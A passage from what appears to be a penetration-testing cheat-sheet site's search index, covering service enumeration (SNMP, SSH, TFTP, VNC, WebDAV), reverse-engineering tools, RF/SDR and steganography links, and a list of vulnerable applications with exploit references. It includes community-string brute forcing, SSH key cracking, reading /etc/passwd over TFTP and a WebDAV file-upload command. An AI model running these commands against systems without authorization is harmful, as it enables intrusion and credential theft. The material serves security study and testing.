.1.3.6.1.4.1.77.1.2.3.1.1 Running Services .1.3.6.1.4.1.77.1.2.27 Share Information Commands: snmp - check 192 . 168 . 1 . 2 - c public snmpget - v 1 - c public IP snmpbulkwalk - v2c - c public - Cn0 - Cr10 IP Tools SNMPWalk sudo apt install --no-upgrade snmp-mibs-downloader snmpwalk - Os - c public - v 1 ip snmpwalk - c public ( TARGET IP ADDRESS ) - v1 - On snmpwalk - c public - v2c ( TARGET IP ADDRESS ) v3 doesnt have easily guessable / default community string Probe MBI snmpwalk - c public - v 1 ip 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 1 . 6 . 0 System Processes \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 2 Running Programs \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 4 . 2 . 1 . 4 Processes Path \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 2 . 3 . 1 . 4 Storage Units \u2022 1 . 3 . 6 . 1 . 2 . 1 . 25 . 6 . 3 . 1 . 2 Software Name \u2022 1 . 3 . 6 . 1 . 4 . 1 . 77 . 1 . 2 . 25 User Accounts \u2022 1 . 3 . 6 . 1 . 2 . 1 . 6 . 13 . 1 . 3 TCP Local Ports onesixtyone Scan one community string for multiple IPs onesixtyone - c community . txt - i ips . txt onesixtyone - c / pwnt / passwords / wordlists / SecLists / Discovery / SNMP / snmp . txt ( TARGET IP ADDRESS ) snmpenum: perl snmpenum . pl 192 . 168 . 38 . 200 public windows . txt OpUtils SolarWinds SNScan SNMP Scanner NS Auditor snmpcheck Hardening References","title":"SNMP - 161/udp"},{"location":"ports-and-protocols/#squidproxy-3128tcp","text":"Quick Reference Usable in pivoting: auxiliary / scanner / http / squid_pivot_scanning nikto - h http : // ( TARGET IP ADDRESS ) - useproxy http : // ( TARGET IP ADDRESS ): 3128 Tools Hardening References","title":"SquidProxy - 3128/tcp"},{"location":"ports-and-protocols/#ssh-22tcp","text":"Quick Reference User Enumeration: searchsploit - m 40136 auxiliary / scanner / ssh / ssh_enumusers Configuration Files ssh_config sshd_config authorized_keys ssh_known_hosts . shosts PPK (Putty) to SSH/RSA key-file puttygen my_private_key . ppk - O private - openssh - o keyfile chmood 600 keyfile ssh - l ( USERNAME ) ( TARGET IP ADDRESS ) - i keyfile RSA key cracking ssh2john id_rsa id_rsa . john john --wordlist=/path/to/rockyou.txt id_rsa.john Tools scanssh scanssh - p - r - e excludes random ( no . ) / Network_ID / Subnet_Mask HASSH - a Profiling Method for SSH Clients and Servers: https://github.com/salesforce/hassh/ \"HASSH\" is a network fingerprinting standard which can be used to identify specific Client and Server SSH implementations. The fingerprints can be easily stored, searched and shared in the form of an MD5 fingerprint. Hardening SSH Auditor: https://github.com/ncsa/ssh-auditor Re-check all known hosts as new credentials are added. It will only check the new credentials. Queue a full credential scan on any new host discovered. Queue a full credential scan on any known host whose ssh version or key fingerprint changes. Attempt command execution as well as attempt to tunnel a TCP connection. Re-check each credential using a per credential scan_interval - default 14 days. References","title":"SSH - 22/tcp"},{"location":"ports-and-protocols/#telnet-23tcp","text":"Quick Reference Configuration files / etc / inetd . conf / etc / xinetd . d / telnet / etc / xinetd . d / stelnet Tools Telnet Honeypot - https://github.com/stamparm/hontel OS fingerprinting with telnet: https://securiteam.com/tools/6J00L0K06U/ Hardening References","title":"Telnet - 23/tcp"},{"location":"ports-and-protocols/#tftp-69tcp","text":"Quick Reference Enumeration tftp ip_address PUT local_file tftp ip_address GET conf.txt ( or other files ) Solarwinds TFTP server tftp \u2013 i IP GET /etc/passwd ( old Solaris ) Connect TFTP tftp connect ( to ) ip tftp verbose Transfer file tftp binary tftp put example . exe / windows / system32 / example . exe Receive file tftp binary tftp get / windows / system32 / example . exe Tools Hardening References","title":"TFTP - 69/tcp"},{"location":"ports-and-protocols/#vnc-5900tcp","text":"Quick Reference Configuration files .vnc / etc / vnc / config $HOME / .vnc / config / etc / sysconfig / vncservers / etc / vnc.conf Registry locations \\ HKEY_CURRENT_USER \\ Software \\ ORL \\ WinVNC3 \\ HKEY_USERS \\ . DEFAULT \\ Software \\ ORL \\ WinVNC3 reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKCU \\ Software \\ TightVNC \\ Server reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Description key: 0 x238210763578887 Connect over SSH tunnel ssh -L5901:127.0.0.1:5901 charix@10.10.10.84 vncviewer 127 .0.0.1::5901 vncviewer 127 .0.0.1::5901\u200b -passwd\u200b secret Tools Hardening References","title":"VNC - 5900/tcp"},{"location":"ports-and-protocols/#webdev","text":"Quick Reference Check Capabilities: davtest - url http : // grandpa . htb / Interact Command-line WebDAV client for Unix: http://www.webdav.org/cadaver/ Commands: https://www.systutorials.com/docs/linux/man/1-cadaver/ cadaver http : // 10 . 10 . 10 . 15 Upload file: curl --upload-file ./example.php --user user:password http:// ip /webdav_url Exploits: IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl - https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl - https://github.com/edwardz246003/IIS_exploit - https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html - https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl IIS 6.0 Tools Hardening References","title":"WebDev"},{"location":"ports-and-protocols/#x11-6000tcp","text":"Quick Reference Configuration files /etc/Xn.hosts /usr/lib/X11/xdm Search through all files for the command xhost + or /usr/bin/X11/xhost + /usr/lib/X11/xdm/xsession /usr/lib/X11/xdm/xsession-remote /usr/lib/X11/xdm/xsession.0 /usr/lib/X11/xdm/xdm-config DisplayManager*authorize:on Tools Hardening References","title":"X11 - 6000/tcp"},{"location":"reverse-engineering/","text":"Tools Diaphora - is a program diffing plugin for IDA / Ghidra: https://github.com/joxeankoret/diaphora radare2 Frida - Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers: https://www.frida.re/ angr - Python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks: https://angr.io/ GEF - GDB Enhanced Features for exploit devs reversers: https://github.com/hugsy/gef YY-CHR - Supports editing NES, SNES, Genesis, PCE, GG, WS/C, GB/C, MSX 1+2, NGP/C, SMS, and GBA graphics: https://www.romhacking.net/utilities/119/ ProcDump - ProcDump provides a convenient way for Linux developers to create core dumps of their application based on performance triggers: https://github.com/Microsoft/ProcDump-for-Linux mleak - Memory leak tracer for C programs: https://github.com/hyc/mleak Demangle function names (C/C++): http://demangler.com Collections Vagrant box with binary analysis tools: https://github.com/Hamz-a/binanalysisbox Language/OS Specific Linux Setup Disable ASLR: sudo sysctl - w kernel . randomize_va_space = 0 Allow ptrace processes: sudo sysctl - w kernel . yama . ptrace_scope = 0 Installing 32bit Libraries dpkg --add-architecture i386 apt-get install libc6:i386 GDB PEDA: http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf Run GBD with env variables: env - gdb / bin / lcars Display Information info registers info all - registers Display memory map: vmmap Display Registers / Memory: display / x $ eax x / 50 c $ eax x / s $ eax Disassemble-flavor: set disassembly - flavor intel Disassemble: disassemble $ eip Print Type Information: ptype Student Check security information: checksec References ELF Binary Mangling Part 1\u200a\u2014\u200aConcepts: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-1-concepts-e00cb1352301 Elf Binary Mangling Pt. 2: Golfin\u2019: https://medium.com/@dmxinajeansuit/elf-binary-mangling-pt-2-golfin-7e5c82bb482c Elf Binary Mangling Part 3\u200a\u2014\u200aWeaponization: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-3-weaponization-6e11971108b3 http://romainthomas.fr/slides/18-06-Recon18-Formats-Instrumentation.pdf Dissecting and exploiting ELF files: https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267 Windows Tools Collections A list of static analysis tools for Portable Executable (PE) files: https://www.peerlyst.com/posts/a-list-of-static-analysis-tools-for-portable-executable-pe-files-susan-parker?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Generate call graphs from VBA code - https://github.com/MalwareCantFly/Vba2Graph libpeconv - A library to load, manipulate, dump PE files https://github.com/hasherezade/libpeconv filealyzer - Helps you explore alternate data streams, #PE/#ELF data and anomalies, file signatures, EXIF data, MZ header, #OpenSBI, #PEiD, #VirusTotal, Android and iOS app (file) info, all in one neat UI: https://www.safer-networking.org/products/filealyzer/ WinDbg - Toy scripts for playing with WinDbg JS API: https://github.com/hugsy/windbg_js_scripts HXD - Hex Editor: https://mh-nexus.de/en/hxd/ Defense Control Flow Guard - Protects the execution flow from redirection - for example, from exploits that overwrite an address in the stack https://86hh.github.io/cfg.html References Rich Header - http://bytepointer.com/articles/the_microsoft_rich_header.htm Learning binary file formats: https://board.flatassembler.net/topic.php?t=20690 https://twitter.com/grysztar/status/1088901193747845120 .NET File Format .text - Import Table, Import Address Table and .NET Section .reloc - To relocate the address which the EntryPoint instruction jumps to (it's the only address contained the IAT). The IT counts just one imported module (mscoree.dll) and one imported function (_CorExeMain for executables and _CorDllMain for dynamic load libraries). .rsrc - Main icon for an executable, since all others resources are in the .NET Section. https://www.ntcore.com/files/dotnetformat.htm https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers/ Dynamically load memory-only modules: Assembly.Load(byte[]) https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks .NET framework included in OS version: https://blogs.msdn.microsoft.com/astebner/2007/03/14/mailbag-what-version-of-the-net-framework-is-included-in-what-version-of-the-os/ Tools CFF Explorer: https://ntcore.com/?page_id=388 PE inspection library allowing .NET programmers to read, modify and write executable files: https://github.com/Washi1337/AsmResolver Parser for Windows Portable Executable headers: https://github.com/secana/PeNet References Reverse Engineering .NET Applications For Beginners: https://www.youtube.com/watch?v=KOVXWRrd_qg Practice https://www.malwaretech.com/beginner-malware-reversing-challenges Defense Disassembly desynchronization: https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md References 101 - https://www.youtube.com/watch?v=Min6DWTHDBw feature=em-uploademail Reverse Engineering for Beginners: https://www.begin.re/ Learning Radare2 by Reversing a UMPC Bios: https://stragedevices.blogspot.com/2019/02/finding-verified-intel-atom-msrs-in.html Survival guide for Radare2 with practice: https://github.com/ZigzagSecurity/survival-guide-radare2 http://www.capstone-engine.org/showcase.html Reverse engineering simple binaries created in Fortran, C, C++, Pascal and Ada: https://www.mkdynamics.net/current_projects/computer_security/Disassembling_binaries/disassembling_binaries.html Port-oriented Programming: https://twitter.com/bxl1989/status/1085101696735268865 OALabs - WinDbg Basics for Malware Analysis: https://www.youtube.com/watch?v=QuFJpH3My7A list=PLGf_j68jNtWG_6ZwFN4kx7jfKTQXoG_BN The 101 of ELF files on Linux: Understanding and Analysis: https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ Ground Zero: Reverse Engineering: https://scriptdotsh.com/index.php/category/reverse-engineering/ ARM SUE 2017 - Reverse Engineering Embedded ARM Devices - by pancake: https://www.youtube.com/watch?v=oXSx0Qo2Upk feature=youtu.be ARM ASSEMBLY BASICS CHEATSHEET: https://azeria-labs.com/assembly-basics-cheatsheet/ GO Set of IDA Pro scripts for parsing GoLang types information stored in compiled binary: https://github.com/sibears/IDAGolangHelper Java Toold, JADX, JD-GUI, Procyon, CFR, Fernflower etc., Bytecodeviewer, dex2jar, APK tool Mobile Apps Inro: https://medium.com/@xplodwild/turning-the-frustration-of-a-mobile-game-into-a-reverse-engineering-training-a9887043efdf They updated, we dumped memory: https://blog.usejournal.com/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85 Now, it\u2019s obfuscated: https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-3-now-its-obfuscated-9c31e29c386b","title":"Reverse engineering"},{"location":"reverse-engineering/#tools","text":"Diaphora - is a program diffing plugin for IDA / Ghidra: https://github.com/joxeankoret/diaphora radare2 Frida - Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers: https://www.frida.re/ angr - Python framework for analyzing binaries. It combines both static and dynamic symbolic (\"concolic\") analysis, making it applicable to a variety of tasks: https://angr.io/ GEF - GDB Enhanced Features for exploit devs reversers: https://github.com/hugsy/gef YY-CHR - Supports editing NES, SNES, Genesis, PCE, GG, WS/C, GB/C, MSX 1+2, NGP/C, SMS, and GBA graphics: https://www.romhacking.net/utilities/119/ ProcDump - ProcDump provides a convenient way for Linux developers to create core dumps of their application based on performance triggers: https://github.com/Microsoft/ProcDump-for-Linux mleak - Memory leak tracer for C programs: https://github.com/hyc/mleak Demangle function names (C/C++): http://demangler.com","title":"Tools"},{"location":"reverse-engineering/#collections","text":"Vagrant box with binary analysis tools: https://github.com/Hamz-a/binanalysisbox","title":"Collections"},{"location":"reverse-engineering/#languageos-specific","text":"","title":"Language/OS Specific"},{"location":"reverse-engineering/#linux","text":"Setup Disable ASLR: sudo sysctl - w kernel . randomize_va_space = 0 Allow ptrace processes: sudo sysctl - w kernel . yama . ptrace_scope = 0 Installing 32bit Libraries dpkg --add-architecture i386 apt-get install libc6:i386 GDB PEDA: http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf Run GBD with env variables: env - gdb / bin / lcars Display Information info registers info all - registers Display memory map: vmmap Display Registers / Memory: display / x $ eax x / 50 c $ eax x / s $ eax Disassemble-flavor: set disassembly - flavor intel Disassemble: disassemble $ eip Print Type Information: ptype Student Check security information: checksec References ELF Binary Mangling Part 1\u200a\u2014\u200aConcepts: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-1-concepts-e00cb1352301 Elf Binary Mangling Pt. 2: Golfin\u2019: https://medium.com/@dmxinajeansuit/elf-binary-mangling-pt-2-golfin-7e5c82bb482c Elf Binary Mangling Part 3\u200a\u2014\u200aWeaponization: https://medium.com/@dmxinajeansuit/elf-binary-mangling-part-3-weaponization-6e11971108b3 http://romainthomas.fr/slides/18-06-Recon18-Formats-Instrumentation.pdf Dissecting and exploiting ELF files: https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267","title":"Linux"},{"location":"reverse-engineering/#windows","text":"Tools Collections A list of static analysis tools for Portable Executable (PE) files: https://www.peerlyst.com/posts/a-list-of-static-analysis-tools-for-portable-executable-pe-files-susan-parker?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Generate call graphs from VBA code - https://github.com/MalwareCantFly/Vba2Graph libpeconv - A library to load, manipulate, dump PE files https://github.com/hasherezade/libpeconv filealyzer - Helps you explore alternate data streams, #PE/#ELF data and anomalies, file signatures, EXIF data, MZ header, #OpenSBI, #PEiD, #VirusTotal, Android and iOS app (file) info, all in one neat UI: https://www.safer-networking.org/products/filealyzer/ WinDbg - Toy scripts for playing with WinDbg JS API: https://github.com/hugsy/windbg_js_scripts HXD - Hex Editor: https://mh-nexus.de/en/hxd/ Defense Control Flow Guard - Protects the execution flow from redirection - for example, from exploits that overwrite an address in the stack https://86hh.github.io/cfg.html References Rich Header - http://bytepointer.com/articles/the_microsoft_rich_header.htm Learning binary file formats: https://board.flatassembler.net/topic.php?t=20690 https://twitter.com/grysztar/status/1088901193747845120","title":"Windows"},{"location":"reverse-engineering/#net","text":"File Format .text - Import Table, Import Address Table and .NET Section .reloc - To relocate the address which the EntryPoint instruction jumps to (it's the only address contained the IAT). The IT counts just one imported module (mscoree.dll) and one imported function (_CorExeMain for executables and _CorDllMain for dynamic load libraries). .rsrc - Main icon for an executable, since all others resources are in the .NET Section. https://www.ntcore.com/files/dotnetformat.htm https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-pe-headers/ Dynamically load memory-only modules: Assembly.Load(byte[]) https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks .NET framework included in OS version: https://blogs.msdn.microsoft.com/astebner/2007/03/14/mailbag-what-version-of-the-net-framework-is-included-in-what-version-of-the-os/ Tools CFF Explorer: https://ntcore.com/?page_id=388 PE inspection library allowing .NET programmers to read, modify and write executable files: https://github.com/Washi1337/AsmResolver Parser for Windows Portable Executable headers: https://github.com/secana/PeNet References Reverse Engineering .NET Applications For Beginners: https://www.youtube.com/watch?v=KOVXWRrd_qg","title":".NET"},{"location":"reverse-engineering/#practice","text":"https://www.malwaretech.com/beginner-malware-reversing-challenges","title":"Practice"},{"location":"reverse-engineering/#defense","text":"Disassembly desynchronization: https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md","title":"Defense"},{"location":"reverse-engineering/#references","text":"101 - https://www.youtube.com/watch?v=Min6DWTHDBw feature=em-uploademail Reverse Engineering for Beginners: https://www.begin.re/ Learning Radare2 by Reversing a UMPC Bios: https://stragedevices.blogspot.com/2019/02/finding-verified-intel-atom-msrs-in.html Survival guide for Radare2 with practice: https://github.com/ZigzagSecurity/survival-guide-radare2 http://www.capstone-engine.org/showcase.html Reverse engineering simple binaries created in Fortran, C, C++, Pascal and Ada: https://www.mkdynamics.net/current_projects/computer_security/Disassembling_binaries/disassembling_binaries.html Port-oriented Programming: https://twitter.com/bxl1989/status/1085101696735268865 OALabs - WinDbg Basics for Malware Analysis: https://www.youtube.com/watch?v=QuFJpH3My7A list=PLGf_j68jNtWG_6ZwFN4kx7jfKTQXoG_BN The 101 of ELF files on Linux: Understanding and Analysis: https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ Ground Zero: Reverse Engineering: https://scriptdotsh.com/index.php/category/reverse-engineering/ ARM SUE 2017 - Reverse Engineering Embedded ARM Devices - by pancake: https://www.youtube.com/watch?v=oXSx0Qo2Upk feature=youtu.be ARM ASSEMBLY BASICS CHEATSHEET: https://azeria-labs.com/assembly-basics-cheatsheet/ GO Set of IDA Pro scripts for parsing GoLang types information stored in compiled binary: https://github.com/sibears/IDAGolangHelper Java Toold, JADX, JD-GUI, Procyon, CFR, Fernflower etc., Bytecodeviewer, dex2jar, APK tool Mobile Apps Inro: https://medium.com/@xplodwild/turning-the-frustration-of-a-mobile-game-into-a-reverse-engineering-training-a9887043efdf They updated, we dumped memory: https://blog.usejournal.com/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85 Now, it\u2019s obfuscated: https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-3-now-its-obfuscated-9c31e29c386b","title":"References"},{"location":"rf-and-sdr/","text":"RF and SDR RFID / NFC Tools ESP-RFID-Tool: https://github.com/rfidtool/ESP-RFID-Tool https://www.aliexpress.com/item/ESP-RFID-Tool/32850151497.html References New References Practical_Guide_To_Hacking_RFID_NFC: https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf Intro to NFC Payment Relay Attacks: https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ Iceman is creating Proxmark3 / RFID / NFC Security related content: https://twitter.com/herrmann1001 https://www.patreon.com/iceman1001?utm_medium=social utm_source=twitter utm_campaign=creatorshare2 RaspberryPi Tools P4wnP1 - P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into \"A Little Offensive Appliance\": https://github.com/mame82/P4wnP1_aloa - Plug Play USB device emulation - HIDScript - Bluetooth - WiFi - Networking - Configuration and Control via CLI , remotely if needed - Configuration and Control via web client - Automation RPI for TX https://github.com/F5OEO/rpitx https://www.rtl-sdr.com/using-an-rtl-sdr-and-rpitx-to-unlock-a-car-with-a-replay-attack/ SDR Tools urh - Universal Radio Hacker: investigate wireless protocols like a boss: https://github.com/jopohl/urh PDF Guide: https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf Video Guide: https://www.youtube.com/watch?v=kuubkTDAxwA index=1 list=PLlKjreY6G-1EKKBs9sucMdk8PwzcFuIPB Wiki: https://github.com/jopohl/urh/wiki - hardware interfaces for common Software Defined Radios - easy demodulation of signals - assigning participants to keep overview of your data - customizable decodings to crack even sophisticated encodings like CC1101 data whitening - assign labels to reveal the logic of the protocol - fuzzing component to find security leaks - modulation support to inject the data back into the system - simulation environment to perform stateful attacks rtl_433 - Program to decode traffic from Devices that are broadcasting on 433.9 MHz like temperature sensors: https://github.com/merbanan/rtl_433 Blog Posts: https://www.rtl-sdr.com/tag/rtl_433/ RPi and RRDTool: https://raspberrypiandstuff.wordpress.com/2017/08/04/rtl_433-on-a-raspberry-pi-made-bulletproof/ gqrx - Software defined radio receiver powered by GNU Radio and Qt: https://github.com/csete/gqrx IMSI-catcher - This program show you IMSI numbers of cellphones around you: https://github.com/Oros42/IMSI-catcher AirplaneJS - An SDR app written in JavaScript that picks up ADS-B radio signals from airplanes and plots them in real time on a map in your browser: https://github.com/watson/airplanejs srsLTE - srsLTE is a free and open-source LTE software suite developed by SRS: https://github.com/srsLTE/srsLTE QSpectrumAnalyzer - Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends): https://github.com/xmikos/qspectrumanalyzer https://twitter.com/YashinMehaboobe/status/1092150871360712704 USB HID USB HID Security - script handling packets coming in from GNURadio via ZMQ and doing some decoding: https://github.com/miek/milight/blob/master/packet_handler.py https://twitter.com/assortedhackery/status/1076886102466801664 USB HID Keyboard: https://github.com/mame82/P4wnP1_aloa/blob/master/hid/keyboard_globals.go#L6 Logitech: https://twitter.com/mame82/status/1077191504412721152 Logitech Unifying After patches: https://twitter.com/mame82/status/1093859460102131717 https://threatpost.com/logitech-keystroke-injection-flaw/139928/ GreHack 2018: Trap Your Keyboard 101 - Marion Lafon: https://www.youtube.com/watch?v=bXMx6lt3Gz0 Resources LoRa Reverse Engineering and AES EM Side-Channel Attacks using SDR: https://archive.fosdem.org/2018/schedule/event/sdr_lora_aes/attachments/slides/2357/export/events/attachments/sdr_lora_aes/slides/2357/LoRa_AES_Security_SDR_FOSDEM_2018.pdf https://www.youtube.com/watch?v=Q-0u87eFAm8 TALKS FROM THE 2018 GNU RADIO CONFERENCE: https://www.rtl-sdr.com/talks-from-the-2018-gnu-radio-conference/ Picking a Needle in a Haystack: Detecting Drones via Network Traffic Analysis: https://arxiv.org/pdf/1901.03535.pdf Listening in to a DECT Digital Cordless Phone with a HackRF: https://www.rtl-sdr.com/listening-in-to-a-dect-digital-cordless-phone-with-a-hackrf/ Building a Carbon Fibre Dual Band Yagi Antenna for Amateur Radio Satellites with 3D Printed Parts for 20\u20ac: https://www.rtl-sdr.com/building-a-carbon-fibre-dual-band-yagi-antenna-for-amateur-radio-satellites-with-3d-printed-parts-for-20e/ Eavesdropping on DECT6.0 Cordless Phones with a HackRF and GR-DECT2: https://www.rtl-sdr.com/youtube-tutorial-eavesdropping-on-dect6-0-cordless-phones-with-a-hackrf-and-gr-dect2/ Implementing your own mobile phone: https://twitter.com/G33KatWork/status/1078580869844140032 Breaking LTE on Layer Two: https://alter-attack.net/ PCILeech uses PCIe hardware devices to read and write from the target system memory: https://github.com/ufrisk/pcileech","title":"RF and SDR"},{"location":"rf-and-sdr/#rf-and-sdr","text":"","title":"RF and SDR"},{"location":"rf-and-sdr/#rfid-nfc","text":"Tools ESP-RFID-Tool: https://github.com/rfidtool/ESP-RFID-Tool https://www.aliexpress.com/item/ESP-RFID-Tool/32850151497.html References New References Practical_Guide_To_Hacking_RFID_NFC: https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf Intro to NFC Payment Relay Attacks: https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ Iceman is creating Proxmark3 / RFID / NFC Security related content: https://twitter.com/herrmann1001 https://www.patreon.com/iceman1001?utm_medium=social utm_source=twitter utm_campaign=creatorshare2","title":"RFID / NFC"},{"location":"rf-and-sdr/#raspberrypi","text":"Tools P4wnP1 - P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into \"A Little Offensive Appliance\": https://github.com/mame82/P4wnP1_aloa - Plug Play USB device emulation - HIDScript - Bluetooth - WiFi - Networking - Configuration and Control via CLI , remotely if needed - Configuration and Control via web client - Automation RPI for TX https://github.com/F5OEO/rpitx https://www.rtl-sdr.com/using-an-rtl-sdr-and-rpitx-to-unlock-a-car-with-a-replay-attack/","title":"RaspberryPi"},{"location":"rf-and-sdr/#sdr","text":"Tools urh - Universal Radio Hacker: investigate wireless protocols like a boss: https://github.com/jopohl/urh PDF Guide: https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf Video Guide: https://www.youtube.com/watch?v=kuubkTDAxwA index=1 list=PLlKjreY6G-1EKKBs9sucMdk8PwzcFuIPB Wiki: https://github.com/jopohl/urh/wiki - hardware interfaces for common Software Defined Radios - easy demodulation of signals - assigning participants to keep overview of your data - customizable decodings to crack even sophisticated encodings like CC1101 data whitening - assign labels to reveal the logic of the protocol - fuzzing component to find security leaks - modulation support to inject the data back into the system - simulation environment to perform stateful attacks rtl_433 - Program to decode traffic from Devices that are broadcasting on 433.9 MHz like temperature sensors: https://github.com/merbanan/rtl_433 Blog Posts: https://www.rtl-sdr.com/tag/rtl_433/ RPi and RRDTool: https://raspberrypiandstuff.wordpress.com/2017/08/04/rtl_433-on-a-raspberry-pi-made-bulletproof/ gqrx - Software defined radio receiver powered by GNU Radio and Qt: https://github.com/csete/gqrx IMSI-catcher - This program show you IMSI numbers of cellphones around you: https://github.com/Oros42/IMSI-catcher AirplaneJS - An SDR app written in JavaScript that picks up ADS-B radio signals from airplanes and plots them in real time on a map in your browser: https://github.com/watson/airplanejs srsLTE - srsLTE is a free and open-source LTE software suite developed by SRS: https://github.com/srsLTE/srsLTE QSpectrumAnalyzer - Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends): https://github.com/xmikos/qspectrumanalyzer https://twitter.com/YashinMehaboobe/status/1092150871360712704 USB HID USB HID Security - script handling packets coming in from GNURadio via ZMQ and doing some decoding: https://github.com/miek/milight/blob/master/packet_handler.py https://twitter.com/assortedhackery/status/1076886102466801664 USB HID Keyboard: https://github.com/mame82/P4wnP1_aloa/blob/master/hid/keyboard_globals.go#L6 Logitech: https://twitter.com/mame82/status/1077191504412721152 Logitech Unifying After patches: https://twitter.com/mame82/status/1093859460102131717 https://threatpost.com/logitech-keystroke-injection-flaw/139928/ GreHack 2018: Trap Your Keyboard 101 - Marion Lafon: https://www.youtube.com/watch?v=bXMx6lt3Gz0 Resources LoRa Reverse Engineering and AES EM Side-Channel Attacks using SDR: https://archive.fosdem.org/2018/schedule/event/sdr_lora_aes/attachments/slides/2357/export/events/attachments/sdr_lora_aes/slides/2357/LoRa_AES_Security_SDR_FOSDEM_2018.pdf https://www.youtube.com/watch?v=Q-0u87eFAm8 TALKS FROM THE 2018 GNU RADIO CONFERENCE: https://www.rtl-sdr.com/talks-from-the-2018-gnu-radio-conference/ Picking a Needle in a Haystack: Detecting Drones via Network Traffic Analysis: https://arxiv.org/pdf/1901.03535.pdf Listening in to a DECT Digital Cordless Phone with a HackRF: https://www.rtl-sdr.com/listening-in-to-a-dect-digital-cordless-phone-with-a-hackrf/ Building a Carbon Fibre Dual Band Yagi Antenna for Amateur Radio Satellites with 3D Printed Parts for 20\u20ac: https://www.rtl-sdr.com/building-a-carbon-fibre-dual-band-yagi-antenna-for-amateur-radio-satellites-with-3d-printed-parts-for-20e/ Eavesdropping on DECT6.0 Cordless Phones with a HackRF and GR-DECT2: https://www.rtl-sdr.com/youtube-tutorial-eavesdropping-on-dect6-0-cordless-phones-with-a-hackrf-and-gr-dect2/ Implementing your own mobile phone: https://twitter.com/G33KatWork/status/1078580869844140032 Breaking LTE on Layer Two: https://alter-attack.net/ PCILeech uses PCIe hardware devices to read and write from the target system memory: https://github.com/ufrisk/pcileech","title":"SDR"},{"location":"steganography/","text":"Images StegHide Extract: steghide extract - p password - sf input . jpg steghide info image . jpg Identify: strings on file should show: 56789 : CDEFGHIJSTUVWXYZcdefghijstuvwxyz Audio Sonic Visualiser\u200b - viewing and analysing the contents of music audio files: https://www.sonicvisualiser.org/","title":"Steganography"},{"location":"steganography/#images","text":"StegHide Extract: steghide extract - p password - sf input . jpg steghide info image . jpg Identify: strings on file should show: 56789 : CDEFGHIJSTUVWXYZcdefghijstuvwxyz","title":"Images"},{"location":"steganography/#audio","text":"Sonic Visualiser\u200b - viewing and analysing the contents of music audio files: https://www.sonicvisualiser.org/","title":"Audio"},{"location":"vulnerable/","text":"Desktop Applications Chkrootkit 0.49 Prev Esc https://www.exploit-db.com/exploits/33899 Mozilla Firefox 45.0 RCE https://www.exploit-db.com/exploits/42484 Zervit 0.4 Acrobat Reader version 8.1.2 \u2013 ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/8.1.2/enu/AdbeRdr812_en_US.exe Java 7 Update 6 JRE \u2013 http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html Winamp 5.5 \u2013 http://www.filehorse.com/download-winamp/4137/download/ Server Applications HttpFileServer 2.3x before 2.3c CVE-2014-6287 RCE https://www.exploit-db.com/exploits/39161 exploit / windows 